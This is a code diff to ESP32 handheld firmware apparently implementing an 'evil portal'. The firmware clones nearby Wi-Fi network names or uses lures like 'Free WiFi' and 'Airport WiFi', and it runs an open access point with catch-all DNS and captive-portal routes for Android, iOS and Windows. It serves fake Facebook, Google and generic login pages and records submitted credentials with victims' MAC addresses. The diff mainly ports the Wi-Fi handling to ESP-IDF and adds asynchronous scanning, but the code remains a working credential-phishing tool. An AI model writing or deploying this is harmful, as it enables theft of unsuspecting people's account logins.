@@ -6,18 +6,27 @@
 #include "../include/evil_portal.h"
 #include "../include/sleep_manager.h"
 #include "../include/pindefs.h"
+#include "esp_wifi.h"
+#include "esp_event.h"
+#include "esp_netif.h"
+#include <WebServer.h>
+#include <DNSServer.h>
 
 extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
+
+namespace {
 
 enum EvilPortalState { 
     PORTAL_MENU, 
     PORTAL_RUNNING,
-    PORTAL_VIEW_CREDS
+    PORTAL_VIEW_CREDS,
+    PORTAL_SCANNING
 };
 
-static EvilPortalState currentState = PORTAL_MENU;
-static int menuSelection = 0;
-static int credIndex = 0;
+EvilPortalState currentState = PORTAL_MENU;
+int menuSelection = 0;
+int credIndex = 0;
+esp_netif_t *ap_netif = NULL;
 
 struct Credential {
     String ssid;
@@ -27,17 +36,23 @@ struct Credential {
     unsigned long captureTime;
 };
 
-static std::vector<Credential> capturedCreds;
-static String currentSSID = "Free WiFi";
-static int connectedClients = 0;
-static int totalVisitors = 0;
+std::vector<Credential> capturedCreds;
+String currentSSID = "Free WiFi";
+int connectedClients = 0;
+int totalVisitors = 0;
 
-static std::vector<String> scannedSSIDs;
-static int currentSSIDIndex = 0;
-static bool scanCompleted = false;
-static unsigned long lastScanTime = 0;
-static unsigned long menuEnterTime = 0;
-static const unsigned long SCAN_INTERVAL = 60000;
+std::vector<String> scannedSSIDs;
+int currentSSIDIndex = 0;
+bool portal_scanCompleted = false;
+unsigned long portal_lastScanTime = 0;
+unsigned long menuEnterTime = 0;
+unsigned long portal_scanStartTime = 0;
+unsigned long portal_lastDisplayUpdate = 0;
+uint16_t portal_lastApCount = 0;
+bool portal_isScanning = false;
+const unsigned long SCAN_INTERVAL = 60000;
+const unsigned long SCAN_DURATION = 8000;
+const unsigned long DISPLAY_UPDATE_INTERVAL = 100;
 
 const char* customSSIDs[] = {
     "Free WiFi", "Guest", "Hotel WiFi", "Airport WiFi",
@@ -147,18 +162,18 @@ const char* googlePortalHTML = R"(
 </html>
 )";
 
-static int currentTemplate = 0;
-static const char* portalTemplates[] = {
+int currentTemplate = 0;
+const char* portalTemplates[] = {
     loginPortalHTML,
     facebookPortalHTML,
     googlePortalHTML
 };
-static const char* templateNames[] = {
+const char* templateNames[] = {
     "Generic Login",
     "Facebook WiFi",
     "Google WiFi"
 };
-static const int numTemplates = 3;
+const int numTemplates = 3;
 
 void handleCaptivePortal() {
     portalServer.send(200, "text/html", portalTemplates[currentTemplate]);
@@ -180,27 +195,17 @@ void handleLogin() {
         esp_err_t err = esp_wifi_ap_get_sta_list(&stationList);
 
         if (err == ESP_OK && stationList.num > 0) {
-            if (stationList.num == 1) {
-                char macStr[18];
-                snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
-                    stationList.sta[0].mac[0], stationList.sta[0].mac[1],
-                    stationList.sta[0].mac[2], stationList.sta[0].mac[3],
-                    stationList.sta[0].mac[4], stationList.sta[0].mac[5]);
-                macAddr = String(macStr);
-            } else {
-                char macStr[18];
-                int lastIdx = stationList.num - 1;
-                snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
-                    stationList.sta[lastIdx].mac[0], stationList.sta[lastIdx].mac[1],
-                    stationList.sta[lastIdx].mac[2], stationList.sta[lastIdx].mac[3],
-                    stationList.sta[lastIdx].mac[4], stationList.sta[lastIdx].mac[5]);
-                macAddr = String(macStr);
-            }
+            int lastIdx = (stationList.num == 1) ? 0 : stationList.num - 1;
+            char macStr[18];
+            snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+                stationList.sta[lastIdx].mac[0], stationList.sta[lastIdx].mac[1],
+                stationList.sta[lastIdx].mac[2], stationList.sta[lastIdx].mac[3],
+                stationList.sta[lastIdx].mac[4], stationList.sta[lastIdx].mac[5]);
+            macAddr = String(macStr);
         }
 
         newCred.macAddress = macAddr;
         newCred.captureTime = millis();
-
         capturedCreds.push_back(newCred);
     }
     portalServer.send(200, "text/html",
@@ -212,84 +217,205 @@ void handleLogin() {
 }
 
 void setupPortalAP() {
-    WiFi.mode(WIFI_AP);
-    WiFi.softAP(currentSSID.c_str(), "");
-    portalDNS.start(DNS_PORT, "*", WiFi.softAPIP());
+    wifi_mode_t currentMode;
+    if (esp_wifi_get_mode(&currentMode) == ESP_OK) {
+        esp_wifi_stop();
+        delay(50);
+        esp_wifi_deinit();
+        delay(50);
+    }
+
+    if (ap_netif != NULL) {
+        esp_netif_destroy(ap_netif);
+        ap_netif = NULL;
+    }
+
+    ap_netif = esp_netif_create_default_wifi_ap();
+
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    esp_wifi_init(&cfg);
+    esp_wifi_set_mode(WIFI_MODE_AP);
+
+    wifi_config_t ap_config = {};
+    memset(&ap_config, 0, sizeof(wifi_config_t));
+    strncpy((char*)ap_config.ap.ssid, currentSSID.c_str(), sizeof(ap_config.ap.ssid) - 1);
+    ap_config.ap.ssid[sizeof(ap_config.ap.ssid) - 1] = '\0';
+    ap_config.ap.ssid_len = currentSSID.length();
+    ap_config.ap.channel = 1;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+    ap_config.ap.ssid_hidden = 0;
+    ap_config.ap.max_connection = 4;
+    ap_config.ap.beacon_interval = 100;
+
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    esp_wifi_start();
+    delay(200);
+
+    esp_netif_ip_info_t ip_info;
+    if (esp_netif_get_ip_info(ap_netif, &ip_info) == ESP_OK) {
+        IPAddress apIP(ip_info.ip.addr);
+        portalDNS.stop();
+        portalDNS.start(DNS_PORT, "*", apIP);
+    }
+
     portalServer.onNotFound(handleCaptivePortal);
     portalServer.on("/", handleCaptivePortal);
     portalServer.on("/login", HTTP_POST, handleLogin);
-    portalServer.on("/generate_204", handleCaptivePortal);  // Android
-    portalServer.on("/hotspot-detect.html", handleCaptivePortal);  // iOS
-    portalServer.on("/connecttest.txt", handleCaptivePortal);  // Windows
-    portalServer.on("/redirect", handleCaptivePortal);  // Windows
-    
+    portalServer.on("/generate_204", handleCaptivePortal);
+    portalServer.on("/hotspot-detect.html", handleCaptivePortal);
+    portalServer.on("/connecttest.txt", handleCaptivePortal);
+    portalServer.on("/redirect", handleCaptivePortal);
+
     portalServer.begin();
-    
 }
 
 void stopPortalAP() {
     portalServer.stop();
     portalDNS.stop();
-    WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_OFF);
-    
+    esp_wifi_stop();
+    delay(50);
+    esp_wifi_deinit();
+    delay(50);
+
+    if (ap_netif != NULL) {
+        esp_netif_destroy(ap_netif);
+        ap_netif = NULL;
+    }
 }
 
-void scanForNetworks() {
-    scanCompleted = false;
+void processScanResults(unsigned long now) {
+    uint16_t number = 0;
+    esp_wifi_scan_get_ap_num(&number);
+    
+    if (number == 0) return;
+    
+    wifi_ap_record_t *ap_info = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t) * number);
+    if (ap_info == NULL) return;
+    
+    memset(ap_info, 0, sizeof(wifi_ap_record_t) * number);
+    uint16_t actual_number = number;
+    esp_err_t err = esp_wifi_scan_get_ap_records(&actual_number, ap_info);
+    
+    if (err == ESP_OK) {
+        for (int i = 0; i < actual_number && scannedSSIDs.size() < 92; i++) {
+            if (ap_info[i].ssid[0] != '\0') {
+                String ssid = String((char*)ap_info[i].ssid);
+                bool exists = false;
+                for (const String& existingSSID : scannedSSIDs) {
+                    if (existingSSID == ssid) {
+                        exists = true;
+                        break;
+                    }
+                }
+                if (!exists) {
+                    scannedSSIDs.push_back(ssid);
+                }
+            }
+        }
+    }
+    
+    free(ap_info);
+}
+
+void startScan() {
     scannedSSIDs.clear();
+    portal_isScanning = true;
+    portal_scanCompleted = false;
+    portal_lastApCount = 0;
+    portal_scanStartTime = millis();
+    portal_lastDisplayUpdate = millis();
     
-    u8g2.clearBuffer();
-    u8g2.setFont(u8g2_font_5x8_tr);
-    u8g2.drawStr(0, 10, "Scanning WiFi...");
-    u8g2.drawStr(0, 22, "Please wait");
-    u8g2.sendBuffer();
-    
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect();
+    esp_wifi_set_mode(WIFI_MODE_STA);
     delay(100);
     
-    int networksFound = WiFi.scanNetworks();
-    int actualScannedCount = 0;
+    wifi_scan_config_t scan_config = {
+        .ssid = NULL,
+        .bssid = NULL,
+        .channel = 0,
+        .show_hidden = false,
+        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
+        .scan_time = {
+            .active = {
+                .min = 120,
+                .max = 200
+            }
+        }
+    };
     
-    for (int i = 0; i < networksFound && scannedSSIDs.size() < 92; i++) {
-        String ssid = WiFi.SSID(i);
-        if (ssid.length() > 0) {
+    esp_wifi_scan_start(&scan_config, false);
+    currentState = PORTAL_SCANNING;
+}
+
+void updateScan() {
+    unsigned long now = millis();
+    
+    // Check for new APs
+    uint16_t currentApCount = 0;
+    esp_wifi_scan_get_ap_num(&currentApCount);
+    
+    if (currentApCount > portal_lastApCount) {
+        processScanResults(now);
+        portal_lastApCount = currentApCount;
+    }
+    
+    if (now - portal_lastDisplayUpdate > DISPLAY_UPDATE_INTERVAL) {
+        u8g2.clearBuffer();
+        u8g2.setFont(u8g2_font_6x10_tr);
+        u8g2.drawStr(0, 10, "Scanning WiFi...");
+        
+        char countStr[32];
+        snprintf(countStr, sizeof(countStr), "Found: %d networks", (int)scannedSSIDs.size());
+        u8g2.drawStr(0, 25, countStr);
+        
+        int barWidth = 120;
+        int barHeight = 10;
+        int barX = 4;
+        int barY = 35;
+        u8g2.drawFrame(barX, barY, barWidth, barHeight);
+        
+        unsigned long elapsed = now - portal_scanStartTime;
+        int fillWidth = ((elapsed * (barWidth - 4)) / SCAN_DURATION);
+        if (fillWidth > (barWidth - 4)) fillWidth = barWidth - 4;
+        if (fillWidth > 0) {
+            u8g2.drawBox(barX + 2, barY + 2, fillWidth, barHeight - 4);
+        }
+        
+        u8g2.setFont(u8g2_font_5x8_tr);
+        u8g2.drawStr(0, 60, "Press SEL to exit");
+        u8g2.sendBuffer();
+        
+        portal_lastDisplayUpdate = now;
+    }
+    
+    if (now - portal_scanStartTime > SCAN_DURATION) {
+        processScanResults(now);
+        esp_wifi_scan_stop();
+
+        for (int i = 0; i < customSSIDCount && scannedSSIDs.size() < 100; i++) {
+            String customSSID = String(customSSIDs[i]);
             bool exists = false;
             for (const String& existingSSID : scannedSSIDs) {
-                if (existingSSID == ssid) {
+                if (existingSSID == customSSID) {
                     exists = true;
                     break;
                 }
             }
             if (!exists) {
-                scannedSSIDs.push_back(ssid);
-                actualScannedCount++;
+                scannedSSIDs.push_back(customSSID);
             }
         }
-    }
-    
-    for (int i = 0; i < customSSIDCount && scannedSSIDs.size() < 100; i++) {
-        scannedSSIDs.push_back(String(customSSIDs[i]));
-    }
-    
-    u8g2.clearBuffer();
-    u8g2.setFont(u8g2_font_5x8_tr);
-    u8g2.drawStr(0, 10, "Scan Complete");
-    char countStr[32];
-    snprintf(countStr, sizeof(countStr), "Found %d networks", actualScannedCount);
-    u8g2.drawStr(0, 22, countStr);
-    u8g2.sendBuffer();
-    delay(1000);
-    
-    scanCompleted = true;
-    lastScanTime = millis();
-}
 
-void checkAutoScan() {
-    if (currentState == PORTAL_MENU && menuEnterTime > 0 && (millis() - menuEnterTime >= SCAN_INTERVAL)) {
-        scanForNetworks();
-        menuEnterTime = millis();
+        portal_isScanning = false;
+        portal_scanCompleted = true;
+        portal_lastScanTime = now;
+        currentState = PORTAL_MENU;
+
+        if (!scannedSSIDs.empty()) {
+            if (currentSSIDIndex >= scannedSSIDs.size()) {
+                currentSSIDIndex = 0;
+            }
+            currentSSID = scannedSSIDs[currentSSIDIndex];
+        }
     }
 }
 
@@ -360,7 +486,11 @@ void drawPortalStatus() {
         strcpy(templateStr, templateNames[currentTemplate]);
     }
     u8g2.drawStr(0, 34, templateStr);
-    connectedClients = WiFi.softAPgetStationNum();
+    
+    wifi_sta_list_t stationList;
+    esp_wifi_ap_get_sta_list(&stationList);
+    connectedClients = stationList.num;
+    
     char statsStr[32];
     snprintf(statsStr, sizeof(statsStr), "Clients:%d Visits:%d", connectedClients, totalVisitors);
     u8g2.drawStr(0, 46, statsStr);
@@ -440,6 +570,8 @@ void drawCredentialsList() {
     u8g2.sendBuffer();
 }
 
+}
+
 void evilPortalSetup() {
     currentState = PORTAL_MENU;
     menuSelection = 0;
@@ -448,18 +580,47 @@ void evilPortalSetup() {
     connectedClients = 0;
     currentSSIDIndex = 0;
     menuEnterTime = millis();
+
     pinMode(BUTTON_PIN_UP, INPUT_PULLUP);
     pinMode(BUTTON_PIN_DOWN, INPUT_PULLUP);
     pinMode(BUTTON_PIN_RIGHT, INPUT_PULLUP);
     pinMode(BUTTON_PIN_LEFT, INPUT_PULLUP);
-    scanForNetworks();
-    if (!scannedSSIDs.empty()) {
-        currentSSID = scannedSSIDs[0];
-    }
+
+    esp_netif_init();
+    esp_event_loop_create_default();
+
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    esp_wifi_init(&cfg);
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    esp_wifi_start();
+
+    scannedSSIDs.clear();
+    portal_isScanning = true;
+    portal_scanCompleted = false;
+    portal_lastApCount = 0;
+    portal_scanStartTime = millis();
+    portal_lastDisplayUpdate = millis();
+    
+    wifi_scan_config_t scan_config = {
+        .ssid = NULL,
+        .bssid = NULL,
+        .channel = 0,
+        .show_hidden = false,
+        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
+        .scan_time = {
+            .active = {
+                .min = 120,
+                .max = 200
+            }
+        }
+    };
+    
+    esp_wifi_scan_start(&scan_config, false);
+    currentState = PORTAL_SCANNING;
 }
 
 void evilPortalLoop() {
-    checkAutoScan();
+    unsigned long now = millis();
     
     static bool upPressed = false, downPressed = false;
     static bool rightPressed = false, leftPressed = false;
@@ -468,8 +629,22 @@ void evilPortalLoop() {
     bool rightNow = digitalRead(BUTTON_PIN_RIGHT) == LOW;
     bool leftNow = digitalRead(BUTTON_PIN_LEFT) == LOW;
 
+    if (currentState == PORTAL_SCANNING) {
+        updateScan();
+        upPressed = upNow;
+        downPressed = downNow;
+        rightPressed = rightNow;
+        leftPressed = leftNow;
+        return;
+    }
+
     switch (currentState) {
         case PORTAL_MENU:
+            if (portal_scanCompleted && now - portal_lastScanTime > SCAN_INTERVAL) {
+                startScan();
+                return;
+            }
+            
             if (upNow && !upPressed) {
                 menuSelection = (menuSelection - 1 + 4) % 4;
                 delay(200);
@@ -510,6 +685,12 @@ void evilPortalLoop() {
         case PORTAL_RUNNING:
             if (leftNow && !leftPressed) {
                 stopPortalAP();
+
+                wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+                esp_wifi_init(&cfg);
+                esp_wifi_set_mode(WIFI_MODE_STA);
+                esp_wifi_start();
+
                 currentState = PORTAL_MENU;
                 menuEnterTime = millis();
                 delay(200);
@@ -541,4 +722,23 @@ void evilPortalLoop() {
     downPressed = downNow;
     rightPressed = rightNow;
     leftPressed = leftNow;
+}
+
+void cleanupEvilPortal() {
+    if (currentState == PORTAL_RUNNING) {
+        portalServer.stop();
+        portalDNS.stop();
+    }
+
+    esp_wifi_stop();
+    delay(50);
+    esp_wifi_deinit();
+    delay(50);
+
+    if (ap_netif != NULL) {
+        esp_netif_destroy(ap_netif);
+        ap_netif = NULL;
+    }
+
+    delay(100);
 }
